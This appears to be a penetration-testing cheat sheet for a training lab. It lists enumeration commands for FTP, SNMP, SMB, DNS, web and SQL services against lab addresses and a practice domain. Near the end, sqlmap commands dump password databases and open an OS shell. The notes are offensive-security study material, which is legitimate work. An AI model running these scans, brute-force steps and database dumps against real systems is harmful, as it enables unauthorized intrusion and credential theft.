
=============== INITIAL SCAN ===============
#SYN Scan, version, top 20 ports, vuln nse scripts, output in all formats
nmap -v -sS -sV --top-ports=20 --script vuln -oA nmap-10.11.1.24-TCP-top20 10.11.1.24






=============== FTP ===============
#Check for ftp anonymous sessions
nmap 10.11.1.13 -p 21 --script=ftp-anon.nse






=============== SNMP ==============
#scan for open snmp
nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt


#Enumerating the Entire MIB Tree
snmpwalk -c public -v1 10.11.1.219
iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP "
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (66160) 0:11:01.60

#snmp community strings
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

#Snmpwalk
snmpwalk -c <communityString> <ipAddress> <mibValue>
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Windows Users
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Running Windows Processes
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

#Enumerating Open TCP Ports
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

#Enumerating Installed Software
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2

#Enumerating Windows Users
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Running Windows Processes
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

#Enumerating Open TCP Ports
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

#Enumerating Installed Software
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2

#Juicy MIB Values 
MIB Value	Microsoft Windows SNMP parameters
1.3.6.1.2.1.25.1.6.0	 System Processes
1.3.6.1.2.1.25.4.2.1.2	 Running Programs
1.3.6.1.2.1.25.4.2.1.4 	Processes Path
1.3.6.1.2.1.25.2.3.1.4 	Storage Units
1.3.6.1.2.1.25.6.3.1.2	 Software Name
1.3.6.1.4.1.77.1.2.25 	User Accounts
1.3.6.1.2.1.6.13.1.3 	TCP Local Ports

#Snmp-check 
snmp-check 10.11.1.5 -c public

#Bruteforcing community strings against list of ip address
onesixtyone -c ListOfcommunity.txt -i ListOfIps.txt






=============== SMB ==============

GOOD CHEATSHEET = https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#nmblookup

#SMB Enum shares
nmap -v --script smb-enum-share.nse -p 445 10.11.1.31

#SMB OS Discovery
nmap -v -p 445,139 --script smb-os-discovery 10.11.1.31

#Scan for SMB vulnerability
#NOTE: If encounter rand.lua errors. Download rand.lua script from github report 
#using "wget https://raw.githubusercontent.com/nmap/nmap/master/nselib/rand.lua" into directory /usr/share/nmap/nselib
nmap -v -p 139,445 --script vuln 10.11.1.8

#NBTSCAN subnet
nbtscan -r 10.11.24.0/24

#SMB security level scan
nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236

#RPC Client null sessions
#NOTE: In windows NT2000/XP default config for SMB allows for nullsessions to be created.
#NOTE: In windows 2003/XP SP2 onwards, this is disabled.
Rpcclient -U "" 10.11.1.5
#if successful look for Juicy info
	enumdomusers		for Users information
	getdompwinfo		for Show password policy
	querydomaininfo		for Domain info
	netshareenum		for find net share


#SMBMAP
smbmap -H 10.11.1.13
Looking up status of [ip]
        [hostname]      <00> -         M <ACTIVE>
        [hostname]      <20> -         M <ACTIVE>
        WORKGROUP       <00> - <GROUP> M <ACTIVE>
        WORKGROUP       <1e> - <GROUP> M <ACTIVE>
                        <03> -         M <ACTIVE>
        INet~Services   <1c> - <GROUP> M <ACTIVE>
        IS~[hostname]   <00> -         M <ACTIVE>

#SMBCLIENT connect to share with anonymous login
smbclient -L //ADAM/wwwroot -

#NMBLOOKUP 
nmblookup -A 10.11.1.31

#ENUM4LINUX
enum4linux 10.11.1.24

#Find pipes using metasploit pipe scanner
msf> use auxiliary/scanner/smb/pipe_auditor
msf> set rhost 10.11.1.31
msf> run






=============== DNS ==============
#Find name server
host -t ns megacorpone.com

#Find mail server
host -t mx megacorpone.com

#Find ipaddress of host
host megacorpone.com


#Forward lookup brute force script
#!/bin/bash
for name in $(cat list.txt); do
        host $name.megacorpone.com | grep "has address" | cut -d" " -f1,4
done


#Reverse dns look up
#!/bin/bash
for ip in $(seq 71 84); do
        host 38.100.193.$ip | grep "megacorp" | cut -d" " -f1,5
Done






=============== WEB ==============
#WHATWEB quick check on web products used
whatweb 10.11.1.24 | tr ',' '\n'

#Nikto scan
nikto -host 10.11.1.49 -Format txt -o nikto_10.11.1.49.txt

#DIRB scan directory
dirb http://10.11.1.5/ /usr/share/wordlists/dirb/common.txt

#WEBDAV test what file extensions are allowed to be uploaded
davtest -url http://10.11.1.2:80







=============== SQL ==============
#Check MSSQL server version
nmap -v -p 1433 --script ms-sql-info 10.11.1.31


#Enumerate pages for vulnerability
sqlmap -u 10.11.24.85 --crawl=1

#Dump password
sqlmap -u http://10.11.24.85:80/comment.php?id=774 --dbms=mysql --dump --threads=5

#Getting shell
sqlmap -u http://10.11.24.85:80/comment.php?id=774 --dbms=mysql --os-shell